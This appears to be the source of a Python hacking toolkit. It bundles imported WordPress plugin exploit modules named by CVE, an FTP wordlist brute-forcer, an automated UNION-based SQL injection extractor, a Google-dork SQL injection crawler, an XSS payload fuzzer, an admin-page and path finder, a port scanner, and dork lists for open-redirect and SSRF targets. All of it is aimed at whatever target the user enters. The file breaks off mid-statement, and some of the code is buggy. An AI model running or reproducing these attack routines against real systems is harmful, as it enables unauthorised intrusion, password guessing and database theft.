from googlesearch import search
from colored import fg, bg, attr
import re
import random
from colorama import Fore, init
import re
import requests
import time
import os
from bs4 import BeautifulSoup as BS
from datetime import datetime
from bs4 import BeautifulSoup
import socket
import colored
import time
import sys
from ftplib import FTP
import json
import pyfiglet
import platform
import itertools
import threading
import threading
import uuid
import ssl
import sys
from requests.exceptions import Timeout
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from Exploits import printModule# ---------------
from Exploits import cherry_plugin# --------------
from Exploits import CVE_2008_3362Download_Manager# ----------
from Exploits import CVE_2014_4725wysija # -------------
from Exploits import CVE_2014_9735_revsliderShell # ------------------
from Exploits import CVE_2015_1579_revsliderConfig# -------
from Exploits import CVE_2015_4455_gravityforms #
from Exploits import CVE_2015_4455_gravityformsindex #
from Exploits import CVE_2015_5151_revsliderCSS#
from Exploits import CVE_2017_16562userpro #
from Exploits import CVE_2018_19207wp_gdpr_compliance #
from Exploits import CVE_2019_9879wp_graphql #
from Exploits import CVE_2006_2529fckeditor #
from Exploits import phpunit
from Exploits import formcraft
from Exploits import Headway
from Exploits import pagelinesExploit
from Exploits import WooCommerce_ProductAddonsExp
from Exploits import WpCateGory_page_icons
from Exploits import Wp_addblockblocker
from Exploits import wp_barclaycart
from Exploits import wp_content_injection
from Exploits import wp_eshop_magic
from Exploits import Wp_HD_WebPlayer
from Exploits import Wp_Job_Manager
from Exploits import wp_miniaudioplayer
from Exploits import Wp_pagelines
from Exploits import wp_support_plus_responsive_ticket_system
from Exploits import wp_ungallery
from Exploits import WP_User_Frontend
from Exploits import viral_optinsExploit
from Exploits import CVE_2019_9978SocialWarfare
from Exploits import WPJekyll_Exporter
from Exploits import Wp_cloudflare
from Exploits import Wprealia
from Exploits import Wpwoocommercesoftware
from Exploits import Wp_enfold_child
from Exploits import Wp_contabileads
from Exploits import Wp_prh_api
from Exploits import Wp_dzs_videogallery
from Exploits import Wp_mmplugin
from Exploits import wpinstall


def Logo(self):
        system()
        logo = Fore.WHITE + '''

 ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ ____ 
||F |||P |||T |||B |||u |||r |||t |||e |||F |||o |||r |||c |||e ||
||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|
                                                                      
        ''' + Fore.RESET

class ftp:

    def __init__(self, host, username, wordlist):
        self.wordlist = wordlist
        self.username = username
        self.host = host
                                                                      
    
    def anonymous(self):
        try:
            ftp = FTP(self.host)
            ftp.login()
            print(Fore.WHITE,"[+] ANONYMOUS LOGIN: ENABLED")
            ftp.quit()
        except:
            print(Fore.RED,"[+] ANONYMOUS LOGIN: DISABLED")
            pass

    def login(self, password):
        try:
            ftp = FTP(self.host, self.username, password)
            ftp.login(self.username, password)
            print(Fore.LIGHTYELLOW_EX,"[+] USERNAME: {}".format(self.username))
            print(Fore.LIGHTYELLOW_EX,"[+] PASSWORD: {}".format(password))
            ftp.quit()
        except:
            print("[+] TRYING: {}".format(password))
            pass

    def brute_force(self):
        try:
            self.wordlist = open(self.wordlist, "r")
            words = self.wordlist.readlines()
            for word in words:
                word = word.strip()
                self.login(word)

        except:
            print(Fore.RED,"[!] WORDLIST NOT FOUND!")
            sys.exit(1)
def system():
    my_system = platform.uname()
    if my_system.system == "Windows":
        return os.system('cls')
    else:
        return os.system('clear')

def CheckSqlInjection(url):
    SqlLOGO =  '''
            *    ███████╗ ██████╗ ██╗         ███████╗ ██████╗ █████╗ ███╗   ██╗███████╗██████╗ 
            *    ██╔════╝██╔═══██╗██║         ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔════╝██╔══██╗
            *    ███████╗██║   ██║██║         ███████╗██║     ███████║██╔██╗ ██║█████╗  ██████╔╝
            *    ╚════██║██║▄▄ ██║██║         ╚════██║██║     ██╔══██║██║╚██╗██║██╔══╝  ██╔══██╗v.1
            *    ███████║╚██████╔╝███████╗    ███████║╚██████╗██║  ██║██║ ╚████║███████╗██║  ██║
            *    ╚══════╝ ╚══▀▀═╝ ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
            *                                                                                   
            *'''
    Checks = [
        "'", "\"", " and false", " and select sleep(3)",
        "' and select sleep(3)", "\" and select sleep(3)"
    ]
    try:
        OrginalResponse = requests.get(
            url,
            headers={
                "user-agent":
                "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
            })
    except Exception as e:
        print(Fore.RED,"[ IsNoTVULN ]",url)
        return
    OrginalLenth = len(OrginalResponse.content)
    OrginalTime = OrginalResponse.elapsed.total_seconds()

    for Check in Checks:
        response = requests.get(
            url + Check,
            headers={
                "user-agent":
                "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
            })
        if (OrginalLenth > len(response.content)
                or response.elapsed.total_seconds() > OrginalTime
            ) and response.status_code > 299:
            print(Fore.RED,f"Try[{Check}]",Fore.RED,url,Fore.RED,"IsNotVuln")
            
        print(Fore.WHITE,f"Try[{Check}]",Fore.CYAN,url , Fore.WHITE,"IsVuln")


def main_2():
    #print(Url)
    for url in Url:
        CheckSqlInjection(url)
done = False
Percentage = 0.0
animationArray = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
def animate():
    global animationArray
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\r' + animationArray[int(int(Percentage)/10)])
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!' + (' ' * 100) + '\r')
class SUBDomains:
	def RegexCleanUp(RegexedArray):
		Cleaned = []
		for Array in RegexedArray:
			Cleaned.append(Array[0])
		return Cleaned


	def Domain2Ip(Domain):
		try:
			Ip = socket.gethostbyname(Domain)
		except:
			Ip = ""
		return Ip


	def GetDomainsFrom_yougetsignal_com(Domain):
		Domains = []

		params = {'remoteAddress': Domain, 'key': '', '_': ''}
		Response = requests.post("https://domains.yougetsignal.com/domains.php", params=params)

		ResponseJson = json.loads(Response.text)

		if ResponseJson["status"] == "Fail":
			return [ResponseJson["status"], []]
		elif ResponseJson["domainCount"] == "0":
			return [ResponseJson["status"], []]

		DomainsWithExplictCheck = ResponseJson['domainArray']
		for Site in DomainsWithExplictCheck:
			Domains.append(Site[0])

		return [ResponseJson["status"], Domains]


	def GetDomainsFrom_ip_www_net(Ip):
		Response = requests.get("http://ip-www.net/" + Ip)
		Domains = re.findall(r'<a id="hlWebsite" rel="nofollow" href=".*">(([A-Za-z0-9-]+\.){1,}[A-Za-z0-9-]+)</a>', Response.text)
		Domains = SUBDomains.RegexCleanUp(Domains)
		return Domains


	def GetDomainsFrom_viewdns_info(Domain):
		Response = requests.get("https://viewdns.info/reverseip/?host=" + Domain + "&t=1", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
		Domains = re.findall(r"<tr> <td>(([A-Za-z0-9-]+\.){1,}[A-Za-z0-9-]+)</td>", Response.text)
		Domains = SUBDomains.RegexCleanUp(Domains)
		return Domains


	def GetDomainsFrom_dnslytics_com(Domain):
		Response = requests.get("https://dnslytics.com/reverse-ip/" + Domain, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
		Domains = re.findall(r'<td><b>(([A-Za-z0-9-]+\.){1,}[A-Za-z0-9-]+)</b></td>', Response.text)
		Domains = SUBDomains.RegexCleanUp(Domains)
		return Domains


	def GetDomainsFrom_api_hackertarget_com(Domain):
		Response = requests.get("http://api.hackertarget.com/reverseiplookup/?q=" + Domain)
		if Response.text.strip() == "API count exceeded - Increase Quota with Membership":
			return []
		return Response.text.splitlines()


	def GetDomainsFrom_reverseip_logontube_com(Domain):
		Domains = []
		try:
			Response = requests.get("http://reverseip.logontube.com/?url=" + Domain + "&output=json")
			ResponseJson = json.loads(Response.text)
		except requests.exceptions.ConnectionError as ERRROR:
			pass
		try:
			for Site in ResponseJson["response"]["domains"]:
				Domains.append(Site)
		except:
			return Domains
		

		return Domains


	def GetDomainsFrom_reverseip_domaintools_com(Domain):
		Response = requests.get("https://reverseip.domaintools.com/search/?q=" + Domain, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0"})
		Domains = re.findall(r'">(([A-Za-z0-9-]+\.){1,}[A-Za-z0-9-]+)</span>', Response.text)
		Domains = SUBDomains.RegexCleanUp(Domains)
		return Domains


def main():
	global done, Percentage
	Domains = [""]


	Domain = input("Enter The Domain : ")
	Output = input("Enter Output Filename : ")

	if type(Output) == type(None):
		print("Reminder: -o isn't set")
	
	Ip = SUBDomains.Domain2Ip(Domain)
	if Ip == "":
		print("Error: Not valid domain")
		exit()

	From_yougetsignal_com = SUBDomains.GetDomainsFrom_yougetsignal_com(Domain)
	if From_yougetsignal_com[0] and From_yougetsignal_com[1] != []:
		for _Domain in From_yougetsignal_com[1]:
			Domains.append(_Domain)
	print("Domains from yougetsignal.com:", len(From_yougetsignal_com[1]))

	From_ip_www_net = SUBDomains.GetDomainsFrom_ip_www_net(Ip)
	if From_ip_www_net != []:
		for _Domain in From_ip_www_net:
			Domains.append(_Domain)
	print("Domains from ip-www.net:", len(From_ip_www_net))

	From_viewdns_info = SUBDomains.GetDomainsFrom_viewdns_info(Domain)
	if From_viewdns_info != []:
		for _Domain in From_viewdns_info:
			Domains.append(_Domain)
	print("Domains from viewdns.info:", len(From_viewdns_info))

	From_dnslytics_com = SUBDomains.GetDomainsFrom_dnslytics_com(Domain)
	if From_dnslytics_com != []:
		for _Domain in From_dnslytics_com:
			Domains.append(_Domain)
	print("Domains from dnslytics.com:", len(From_dnslytics_com))
	
	From_api_hackertarget_com = SUBDomains.GetDomainsFrom_api_hackertarget_com(Domain)
	if From_api_hackertarget_com != []:
		for _Domain in From_api_hackertarget_com:
			Domains.append(_Domain)
	print("Domains from api.hackertarget.com:", len(From_api_hackertarget_com))

	From_reverseip_logontube_com = SUBDomains.GetDomainsFrom_reverseip_logontube_com(Domain)
	if From_reverseip_logontube_com != []:
		for _Domain in From_reverseip_logontube_com:
			Domains.append(_Domain)	
	print("Domains from reverseip.logontube.com:", len(From_reverseip_logontube_com))

	From_reverseip_domaintools_com = SUBDomains.GetDomainsFrom_reverseip_domaintools_com(Domain)
	if From_reverseip_domaintools_com != []:
		for _Domain in From_reverseip_domaintools_com:
			Domains.append(_Domain)
	print("Domains from reverseip.domaintools.com:", len(From_reverseip_domaintools_com))
	
	Domains = list(dict.fromkeys(Domains))
	print("All domains without duplicates: ",len(Domains))
	if 1 == 1 :
		_x = 0
		Percentage = (_x/len(Domains)) * 100
		t = threading.Thread(target=animate)
		t.start()
		for _Domain in Domains:
			_Ip = SUBDomains.Domain2Ip(_Domain)
			if Ip != _Ip or _Ip == "":
				Domains.remove(_Domain)
			_x += 1
			Percentage = (_x/len(Domains)) * 100
		done = True
		time.sleep(1)
		print("All domains with same ip:", len(Domains))
	if type(Output) != type(None):
		f = open(Output, mode="a")
		for _Domain in Domains:
			print(_Domain)
			f.write(_Domain + "\n")
		f.close()








def SQLInjection():

    print(Fore.LIGHTBLACK_EX," ________   _______  _      ____ _____ _______    _____  ____  _      _____ ")
    print(Fore.WHITE,"|  ____\ \ / /  __ \| |    / __ \_   _|__   __|  / ____|/ __ \| |    |_   _|")
    print(Fore.YELLOW,"| |__   \ V /| |__) | |   | |  | || |    | |    | (___ | |  | | |      | |")  
    print(Fore.LIGHTYELLOW_EX,"|  __|   > < |  ___/| |   | |  | || |    | |     \___ \| |  | | |      | |")  
    print(Fore.RED,"| |____ / . \| |    | |___| |__| || |_   | |     ____) | |__| | |____ _| |_ ")
    print(Fore.WHITE, "|______/_/ \_\_|    |______\____/_____|  |_|    |_____/ \___\_\______|_____|")
    print(Fore.WHITE,"Start Exploit at : ",datetime.now())

    Bypass = ["--", "#", "//", ""]
    bypass = ""
    ug = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.132 Safari/537.36"}
    url = input(" Enter The Target : ")
    RequestToReadResponse = requests.get(url=url, headers=ug)
    errors = {
        "sql syntax;",
        "unclosed quotation mark after the character string",
        "warning",
        "quoted string not properly terminated",
        "unknown column",
        "mysql",
        "db Error", "sql syntax;", "mysql_fetch_assoc", "mysql_fetch_array", "mysql_num_rows","is_writable","mysql_result", "pg_exec", "mysql_result", "mysql_num_rows", "mysql_query", "pg_query","System Error","io_error", "privilege_not_granted", "getimagesize", "preg_match","mysqli_result", "mysqli"
        }

    x = False
    errorNama = []
    NumberForCulm = 0

    for _Bypass in Bypass:
        PayloadQuotes = f"{url}{_Bypass}"
        response = requests.get(url=PayloadQuotes, headers=ug)
        for error in errors:
            if (x := (error in response.text.lower() or len(RequestToReadResponse.text.lower()) > len(response.text.lower()))):
                bypass = _Bypass
                break
        if (error in response.text.lower() or len(RequestToReadResponse.text.lower()) > len(response.text.lower())):
            break


    date = "[" + datetime.now().strftime("%H:%M:%S") + "]"
    print(Fore.WHITE, date, Fore.LIGHTBLACK_EX, "Start Now Scan : ")
    print(Fore.WHITE, date, " IN THIS TARGET : ", Fore.BLUE, response.url)
    print(Fore.WHITE, date, Fore.GREEN, response.status_code)


    if x or len(RequestToReadResponse.text.lower()) > len(response.text.lower()):
        for _Bypass in Bypass:
            PayloadQuotes = f"{url}+ORDER+BY+{_Bypass}"
            response = requests.get(url=PayloadQuotes, headers=ug)
            for error in errors:
                if (x := not (error in response.text.lower() or len(RequestToReadResponse.text.lower()) > len(response.text.lower()))):
                    bypass = _Bypass
                    break
            if not (error in response.text.lower() or len(RequestToReadResponse.text.lower()) > len(response.text.lower())):
                break
        print(Fore.WHITE, date, Fore.LIGHTRED_EX, "Yes Is Have Vuln")
        for i in range(1, 1000):
            URL2 = f"{url}+ORDER+BY+{i}{bypass}"
            print(Fore.WHITE, date, Fore.LIGHTYELLOW_EX, URL2)
            
            try:
                res = requests.get(url=URL2, timeout=5, headers=ug)
                LenSrc = str(res.text.lower())
            except:
                LenSrc = "mysql"
            
            for error in errors:
                if error in LenSrc:
                    NumberForCulm = i - 1
                    break
            if len(RequestToReadResponse.text.lower()) > len(LenSrc):
                NumberForCulm = i - 1
                break
            
    print(Fore.WHITE, date, Fore.CYAN, "Number of columns : ", Fore.LIGHTWHITE_EX,NumberForCulm, Fore.RESET)
    co = NumberForCulm 
    payload_For_Exploit = ''
    listt = []

    for i in range(0,co):
        if (i == 0):
            SqlTAG = "</SQL></body>"
            payload_For_Exploit += '\\"<body id=4461786500><Sql id=4461786500>ColumnNumber_' + str(
                i + 1) + str(SqlTAG) + ''
            listt.append(payload_For_Exploit)
        else:
            SqlTAG = "</SQL>"
            payload_For_Exploit += ',"<body id=4461786500><Sql id=4461786500>ColumnNumber_' + str(
                i + 1) + str(SqlTAG) + '"'

            listt.append(payload_For_Exploit)

    #HEX ENcoding Daxe = 4461786500
    print(Fore.WHITE, date, Fore.LIGHTMAGENTA_EX,
        " Start UNION_SELECT : ")

    vulnColumn = 0
    try:
        URLRequesWithPayload = f"{url}+union+select+{payload_For_Exploit}"
        req = requests.get(url=URLRequesWithPayload)
        Soup = BS(req.text, 'html.parser')
        for PrintCOlUMIsVuln in Soup.find_all(id=4461786500):
            Notreaplace = PrintCOlUMIsVuln
            print("\n")
            c1 = str(PrintCOlUMIsVuln).replace(
                '<body id="4461786500"><sql id="4461786500">',
                ' ')
            c2 = c1.replace('<sql id="4461786500">', ' ')
            c3 = c2.replace('</sql></body>', ' ')
            c4 = c3.replace('</sql>', ' ')
            print(Fore.CYAN, "THIS CLOUM IS VULN : ", c4)
            vulnColumn = int(c4.split("_")[1])

            

            print(Fore.WHITE, req.url)

            break

    except requests.exceptions.ConnectionError as ERROR:
        print("dd")  

    Exploit = "(select database())"


    for i in range(NumberForCulm):
        if (i == 0):
            _Exploit = Exploit if (i+1) == vulnColumn else '"ColumnNumber_' + str(i + 1) + '"'
            payload_For_Exploit = 'concat("<body id=4461786500><Sql id=4461786500>",' + _Exploit + ',"</SQL></body>")'
        else:
            _Exploit = Exploit if (i+1) == vulnColumn else '"ColumnNumber_' + str(i + 1) + '"'
            payload_For_Exploit += ',concat("<body id=4461786500><Sql id=4461786500>",' + _Exploit + ',"</SQL>")'


    try:
        URLRequesWithPayload = f"{url}+union+select+{payload_For_Exploit}"
        req = requests.get(url=URLRequesWithPayload)
        Soup = BS(req.text, 'html.parser')
        for PrintCOlUMIsVuln in Soup.find_all(id=4461786500):
            Notreaplace = PrintCOlUMIsVuln
            print("\n")
            c1 = str(PrintCOlUMIsVuln).replace(
                '<body id="4461786500"><sql id="4461786500">',
                ' ')
            c2 = c1.replace('<sql id="4461786500">', ' ')
            c3 = c2.replace('</sql></body>', ' ')
            c4 = c3.replace('</sql>', ' ')
            print(Fore.CYAN, "THIS CLOUM IS VULN : ", c4)

            print(Notreaplace)

            print(Fore.WHITE, req.url)

            break

    except requests.exceptions.ConnectionError as ERROR:
        pass

def AdminPageFinder():

    print(Fore.CYAN, "╔═╗┌┬┐┌┬┐┬┌┐┌╔═╗┌─┐┌┬┐┬ ┬╔═╗┬┌┐┌┌┬┐┌─┐┬─┐")
    print(Fore.LIGHTGREEN_EX, "╠═╣ │││││││││╠═╝├─┤ │ ├─┤╠╣ ││││ ││├┤ ├┬┘")
    print(Fore.LIGHTYELLOW_EX, "╩ ╩─┴┘┴ ┴┴┘└┘╩  ┴ ┴ ┴ ┴ ┴╚  ┴┘└┘─┴┘└─┘┴└─")
    print("Start at :", Fore.WHITE, datetime.now())

    try:
        PathAdminPage = open("Payloads\AdminFinder.txt", 'r').readlines()
        Fore.WHITE
        Target = str(input("Entrt The URL :"))
        for request_Admin_Pages in PathAdminPage:
            URL = Target + request_Admin_Pages
            User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
            LisiUserAgent = str(random.choice(User_Agent)).strip()
            UserAgentREQUEST = {"User-Agent": LisiUserAgent}
            req = requests.get(url=URL, headers=UserAgentREQUEST)
            URL2 = req.url.replace('%0A', ' ')
            if req.status_code == 200:
                print(
                    Fore.WHITE,
                    "[" + datetime.now().strftime("%H:%M:%S") + "]",
                    Fore.CYAN,
                    URL2,
                    Fore.GREEN,
                    req.status_code,
                )
            else:
                print(Fore.LIGHTYELLOW_EX,
                      "[" + datetime.now().strftime("%H:%M:%S") + "]",
                      Fore.RED, URL2, Fore.LIGHTYELLOW_EX, req.status_code,
                      Fore.RED, "NOTFOUND")
    except requests.exceptions.ConnectionError and KeyboardInterrupt:
        pass


def Port_SCANNER(Enter):
    print(Fore.YELLOW, "╔═╗╦═╗╔═╗╔╦╗  ╔═╗╔═╗╔═╗╔╗╔")
    print(Fore.LIGHTBLUE_EX, "╠═╝╠╦╝║ ║ ║   ╚═╗║  ╠═╣║║║")
    print(Fore.LIGHTRED_EX, "╩  ╩╚═╚═╝ ╩   ╚═╝╚═╝╩ ╩╝╚╝")
    print(Fore.WHITE, "Start Scan At : ",
          "[" + datetime.now().strftime("%H:%M:%S") + "]")
    try:
        Enter = Enter
        target = socket.gethostbyname(Enter)

        PortsitsOpen = []

        dete = "[" + datetime.now().strftime("%H:%M:%S") + "]"

        for port in range(1, 65535):

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)

            result = s.connect_ex((target, port))
            if result == 0:

                PortsitsOpen.append(port)

                portS = {"PorItsOpen": port}
                print(Fore.WHITE, dete, Fore.CYAN, portS)
            else:
                portS = {"PorItsNotOpen": port}
                print(Fore.WHITE, dete, Fore.RED, portS)
            s.close()

        for PrintPorts in PortsitsOpen:
            print(Fore.WHITE, "This Ports its Open : ")
            print(" ", PrintPorts, "\n")
    except socket.gaierror or KeyboardInterrupt:
        pass


class XSS_SCAN_ALL_TYPE:
    def XSS_Reflected():
        try:

            dete = " [ " + datetime.now().strftime("%H:%M:%S") + " ] "
            print(Fore.LIGHTMAGENTA_EX, "---" * 20)

            print(Fore.WHITE,
                  "═╗ ╦╔═╗╔═╗  ╦═╗╔═╗╔═╗╦  ╔═╗╔═╗╔╦╗╔═╗╔╦╗  ╔═╗╔═╗╔═╗╔╗╔")
            print(Fore.YELLOW,
                  "╔╩╦╝╚═╗╚═╗  ╠╦╝║╣ ╠╣ ║  ║╣ ║   ║ ║╣  ║║  ╚═╗║  ╠═╣║║║")
            print(Fore.LIGHTBLACK_EX,
                  "╩ ╚═╚═╝╚═╝  ╩╚═╚═╝╚  ╩═╝╚═╝╚═╝ ╩ ╚═╝═╩╝  ╚═╝╚═╝╩ ╩╝╚╝")

            print(Fore.LIGHTWHITE_EX,
                  "Scanning started at:" + str(datetime.now()))
            print(Fore.LIGHTMAGENTA_EX, "---" * 20)
            url = input(Fore.WHITE + "Enter a URL for Scanning  : ")
            re
            payloads = open("Payloads/Payload_XSS.txt", 'r')
            if re.findall('http|https', url):
                try:
                    for py in payloads:

                        UrlAndPayload = f"{url}{py}"
                        time.sleep(2)
                        req = requests.get(url=UrlAndPayload)

                        time.sleep(2)
                        soup = BS(req.text, 'html.parser')

                        TitleTag = soup.find_all('title')

                        SvgTAGPAYLOAD = soup.find_all('svg', class_="XSS")
                        scriptTag_JavaScript = soup.find_all('script',
                                                             class_="XSS")
                        URL2 = req.url.replace('%0A', ' ')
                        Found = Fore.WHITE + URL2 + Fore.CYAN + py
                        NotFound = Fore.YELLOW + py

                        ClassFromAlltage = soup.find_all(class_="XSS")

                        if len(scriptTag_JavaScript) >= 1:
                            pa = {" ": py}
                            print(Fore.CYAN, dete, Fore.WHITE, "[ URL : ]",
                                  Fore.LIGHTYELLOW_EX, URL2)
                            print(Fore.CYAN, dete, Fore.WHITE, "[ Payload : ]",
                                  Fore.WHITE, pa)

                        elif len(ClassFromAlltage) >= 1:
                            pa = {" ": py}
                            print(Fore.CYAN, dete, Fore.WHITE, "[ URL : ]",
                                  Fore.LIGHTYELLOW_EX, URL2)
                            print(Fore.CYAN, dete, Fore.WHITE, "[ Payload : ]",
                                  Fore.WHITE, pa)

                        elif "XSS" in TitleTag:
                            pa = {" ": py}

                            print(Fore.CYAN, dete, Fore.LIGHTYELLOW_EX,
                                  "[ URL : ]", URL2)
                            print(Fore.CYAN, dete, Fore.WHITE, "[ Payload : ]",
                                  pa)

                        elif len(SvgTAGPAYLOAD) >= 1:
                            pa = {" ": py}
                            print(Fore.CYAN, dete, Fore.LIGHTYELLOW_EX,
                                  "[ URL : ]", URL2)
                            print(Fore.CYAN, dete, Fore.WHITE, "[ Payload : ]",
                                  pa)

                        else:
                            pa = {" ": py}
                            print(Fore.WHITE, dete, Fore.RED, "[ Payload : ]",
                                  pa)
                except requests.exceptions.ConnectionError:
                    pass
            else:
                Fore.RESET
                exit()
        except KeyboardInterrupt:
            pass

def Dork_scan_sql(Target, cout):
    #By Matrix 
        for i in search(Target):
            print(i)
            pa = "'"
            h = requests.get(i + pa)
            soup = BeautifulSoup(h.content, 'html.parser')
            if len(soup.find_all(text=re.compile("SQL syntax"))) > 0:

                print(Fore.GREEN,"[SQL Found]==" + i)
                open("SQL-injection", "a").write("[SQL Found]==" + i + "\n")
            elif len(soup.find_all(text=re.compile("Warning"))) > 0:
                print(Fore.GREEN,"[SQL Found]==" + i)
                open("SQL-injection.txt",
                     "a").write("[SQL Found]==" + i + "\n")
            else:
                print(Fore.RED,"[No SQL Found ]")

def Bring_Links(target):


    User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
    LisiUserAgent = str(random.choice(User_Agent)).strip()
    UserAgentREQUEST = {"User-Agent": LisiUserAgent}

    domain = f"https://api.hackertarget.com/pagelinks/?q={target}"

    res = requests.get(url=domain, headers=UserAgentREQUEST).text

    print(Fore.WHITE, res)


def PathForcing(url):
    init()
    system()
    print(Fore.RED, "╔╗ ┬─┐┬ ┬┌┬┐┌─┐  ╔═╗┌─┐┬─┐┌─┐┌─┐  ┌─┐┌─┐┌┬┐┬ ┬")
    print(Fore.LIGHTCYAN_EX, "╠╩╗├┬┘│ │ │ ├┤   ╠╣ │ │├┬┘│  ├┤   ├─┘├─┤ │ ├─┤")
    print(Fore.WHITE, "╚═╝┴└─└─┘ ┴ └─┘  ╚  └─┘┴└─└─┘└─┘  ┴  ┴ ┴ ┴ ┴ ┴")
    url = url 
    text = open("Payloads/Path_Forcing.txt", 'r')
    path = f"{url}/robots.txt"

    res = requests.get(url=path, verify=False)
    if res.status_code == 200:
        if len(res.content) < 20:
            SRCRobotsTEXT = res.content
            for AllLinked in SRCRobotsTEXT:
                print(AllLinked)
        else:
            pass
    else:
        pass
    try:
        for tx in text:
            target = f"{url}/{tx}"
            User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
            LisiUserAgent = str(random.choice(User_Agent)).strip()
            UserAgentREQUEST = {"User-Agent": LisiUserAgent}
            req = requests.get(url=target, headers=UserAgentREQUEST)
            URL2 = req.url.replace('%0A', ' ')
            x = len(req.text)
            if req.status_code == 200:
                print(Fore.CYAN,
                      "[ " + datetime.now().strftime("%H:%M:%S") + " ]", "\t",
                      Fore.LIGHTWHITE_EX, URL2, Fore.CYAN, req.status_code)
            
            elif req.status_code == 403:
                print(Fore.WHITE,
                      "[ " + datetime.now().strftime("%H:%M:%S") + " ]", "\t",
                      Fore.CYAN, URL2, Fore.WHITE, req.status_code , "Forbidden")
            else:
                print(Fore.LIGHTYELLOW_EX,
                      "[ " + datetime.now().strftime("%H:%M:%S") + " ]", "\t",
                      Fore.RED, URL2, Fore.LIGHTYELLOW_EX, req.status_code)

    except EnvironmentError:
        exit()

def Path_With_GOOGLE(target):
    target = target
    redirect = [
        f"inurl:?next={target}",
        f"inurl:?url={target}",
        f"inurl:?target={target}",
        f"inurl:?rurl={target}",
        f"inurl:?dest={target}",
        f"inurl:?distination={target}",
        f"inurl:?redir={target}",
        f"inurl:?redirect_url={target}",
        f"inurl:?redirect_url={target}",
        f"inurl:/redirect/={target}",
        f"inurl:/cgi-bin/redirect.cgi?={target}",
        f"inurl:/out/={target}",
        f"inurl:/out?={target}",
        f"inurl:?veiw={target}",
        f"inurl:?login?to={target}",
        f"inurl:?image?to={target}",
        f"inurl:?go={target}",
        f"inurl:?return={target}",
        f"inurl:?returnTo={target}",
        f"inurl:?return_to={target}",
        f"inurl:?checkout_url={target}",
        f"inurl:?continue={target}",
        f"inurl:?return_path={target}",
    ]
    SSRF = [
        f"inurl:?dest={target}",
        f"inurl:?redirect={target}",
        f"inurl:?url={target}",
        f"inurl:?path={target}",
        f"inurl:?continue={target}",
        f"inurl:?uri={target}",
        f"inurl:?window={target}",
        f"inurl:?data={target}",
        f"inurl:?reference={target}",
        f"inurl:?site={target}",
        f"inurl:?html={target}",
        f"inurl:?val={target}",
        f"inurl:?validata={target}",
        f"inurl:?domain={target}",
        f"inurl:?return={target}",
        f"inurl:?page={target}",
        f"inurl:?feed={target}",
        f"inurl:?host={target}",
        f"inurl:?port={target}",
        f"inurl:?to={target}",
        f"inurl:?out={target}",
        f"inurl:?veiw={target}",
        f"inurl:?dir={target}",
    ]

    Paths = [
        f"site:{target}+inurl:fileupload",
        f"site:{target}+inurl:robots.txt",
        f"site:{target}+inurl:sql",
        f"site:{target}+inurl:file",
        f"site:{target}+inurl:search",
        f"site:{target}+inurl:redir+|+inurl:url+|+inurl:redirect+|+inurl:return+|+inurl:src=http+|+inurl:r=http",
        f"site:{target}+inurl:login+|+inurl:admin",
        f"site:{target}+inurl:phpunit",
        f"site:{target}+inurl:php?",
        f"site:{target}+inurl:php?ID=",
        f"site:{target}+inurl:=?id",
        f"site:{target}+inurl:=phpunit",
    ]
    Urls = []
    try:
        for Redirects in redirect:
            for Path_Red in search(Redirects, num_results=100):
                Urls.append(Path_Red)

        for SSRF_Path in SSRF:
            for Path_SSRF in search(SSRF_Path, num_results=100):
                Urls.append(Path_SSRF)

        for Domains in Paths:
            for Path_inurl in search(Domains, num_results=100):
                Urls.append(Path_inurl)
    except requests.exceptions.HTTPError:
        pass
    if len(Urls) != 0:
	for Url in Ulrs:
            print(Fore.WHITE,Url)
class Information_Gethring:
    def ipapi_co(target):

        print("--------" * 21)
        print(Fore.WHITE + '''               
. _  _  _ .  . 
||_)(_||_)|  . 
 |     |       ''')

        try:
            target = target
            ip = socket.gethostbyname(target)
            url = f"https://ipapi.co/{ip}/json"
            User_Agent = open('Payloads/UserAgents.txt', 'r').readlines()
            LisiUserAgent = str(random.choice(User_Agent)).strip()
            UserAgentREQUEST = {"User-Agent": LisiUserAgent}
            res = requests.get(url=url, headers=UserAgentREQUEST)
            JsonSRC = json.loads(res.content)
            print("---> ", Fore.CYAN, "IP : ", JsonSRC['ip'], Fore.RESET)
            print("---> ", Fore.BLUE, "version :", JsonSRC['version'],
                  Fore.RESET)
            print("---> ", Fore.GREEN, "city : ", JsonSRC['city'])
            print("---> ", Fore.LIGHTMAGENTA_EX, "region : ",
                  JsonSRC['region'], Fore.RESET)
            print("---> ", Fore.WHITE, "region_code : ",
                  JsonSRC['region_code'], Fore.RESET)
            print("---> ", Fore.LIGHTYELLOW_EX, "country : ",
                  JsonSRC['country'], Fore.RESET)
            print("---> ", Fore.MAGENTA, "country_name : ",
                  JsonSRC['country_name'], Fore.RESET)
            print("---> ", Fore.LIGHTMAGENTA_EX, "country_code : ",
